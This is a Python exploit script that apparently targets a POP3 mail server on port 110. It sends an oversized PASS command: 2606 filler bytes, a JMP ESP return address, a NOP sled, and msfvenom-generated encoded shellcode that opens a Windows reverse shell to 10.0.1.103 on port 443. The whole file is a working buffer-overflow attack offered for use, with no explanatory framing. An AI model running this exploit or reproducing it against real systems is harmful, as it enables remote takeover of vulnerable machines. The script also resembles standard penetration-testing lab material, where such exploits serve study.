#!/usr/bin/env python
#by Anakein
import struct, time, sys
import socket as so

# msfvenom -p windows/shell_reverse_tcp lhost=10.0.1.103 lport=443 -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python
#Payload size: 351 bytes

buf =  ""
buf += "\xba\xca\xcb\x1b\x96\xda\xdc\xd9\x74\x24\xf4\x58\x2b"
buf += "\xc9\xb1\x52\x83\xc0\x04\x31\x50\x0e\x03\x9a\xc5\xf9"
buf += "\x63\xe6\x32\x7f\x8b\x16\xc3\xe0\x05\xf3\xf2\x20\x71"
buf += "\x70\xa4\x90\xf1\xd4\x49\x5a\x57\xcc\xda\x2e\x70\xe3"
buf += "\x6b\x84\xa6\xca\x6c\xb5\x9b\x4d\xef\xc4\xcf\xad\xce"
buf += "\x06\x02\xac\x17\x7a\xef\xfc\xc0\xf0\x42\x10\x64\x4c"
buf += "\x5f\x9b\x36\x40\xe7\x78\x8e\x63\xc6\x2f\x84\x3d\xc8"
buf += "\xce\x49\x36\x41\xc8\x8e\x73\x1b\x63\x64\x0f\x9a\xa5"
buf += "\xb4\xf0\x31\x88\x78\x03\x4b\xcd\xbf\xfc\x3e\x27\xbc"
buf += "\x81\x38\xfc\xbe\x5d\xcc\xe6\x19\x15\x76\xc2\x98\xfa"
buf += "\xe1\x81\x97\xb7\x66\xcd\xbb\x46\xaa\x66\xc7\xc3\x4d"
buf += "\xa8\x41\x97\x69\x6c\x09\x43\x13\x35\xf7\x22\x2c\x25"
buf += "\x58\x9a\x88\x2e\x75\xcf\xa0\x6d\x12\x3c\x89\x8d\xe2"
buf += "\x2a\x9a\xfe\xd0\xf5\x30\x68\x59\x7d\x9f\x6f\x9e\x54"
buf += "\x67\xff\x61\x57\x98\xd6\xa5\x03\xc8\x40\x0f\x2c\x83"
buf += "\x90\xb0\xf9\x04\xc0\x1e\x52\xe5\xb0\xde\x02\x8d\xda"
buf += "\xd0\x7d\xad\xe5\x3a\x16\x44\x1c\xad\x13\x99\x1f\x4a"
buf += "\x4c\x9b\x1f\x95\x37\x12\xf9\xff\x57\x73\x52\x68\xc1"
buf += "\xde\x28\x09\x0e\xf5\x55\x09\x84\xfa\xaa\xc4\x6d\x76"
buf += "\xb8\xb1\x9d\xcd\xe2\x14\xa1\xfb\x8a\xfb\x30\x60\x4a"
buf += "\x75\x29\x3f\x1d\xd2\x9f\x36\xcb\xce\x86\xe0\xe9\x12"
buf += "\x5e\xca\xa9\xc8\xa3\xd5\x30\x9c\x98\xf1\x22\x58\x20"
buf += "\xbe\x16\x34\x77\x68\xc0\xf2\x21\xda\xba\xac\x9e\xb4"
buf += "\x2a\x28\xed\x06\x2c\x35\x38\xf1\xd0\x84\x95\x44\xef"
buf += "\x29\x72\x41\x88\x57\xe2\xae\x43\xdc\x12\xe5\xc9\x75"
buf += "\xbb\xa0\x98\xc7\xa6\x52\x77\x0b\xdf\xd0\x7d\xf4\x24"
buf += "\xc8\xf4\xf1\x61\x4e\xe5\x8b\xfa\x3b\x09\x3f\xfa\x69"

try:
    server = str(sys.argv[1])
    port = int(sys.argv[2])

except IndexError:
    print("Usage: python %s 10.0.1.107 110" % sys.argv[0])
    sys.exit()

#JMP ESP address is 5F4A358F
jmpesp = struct.pack("I", 0x5f4a358f)

payload = 'A'*2606 + jmpesp + '\x90' * 25 + buf

s = so.socket(so.AF_INET, so.SOCK_STREAM)                   # Create socket

try:
    print('Connecting to host...')
    s.connect((server, port))                               # Connect host to port
    s.recv(1024)                                            # receive
    s.send('USER anakein \r\n')                             # send USER    
    s.recv(1024)                                            # receiver
    s.send('PASS ' + payload + '\r\n')                      # send PASS (payload)
    s.close()                                               # close connection 
    print('\nDone!')

except:
    print('Destination host unreachable')
    sys.exit()
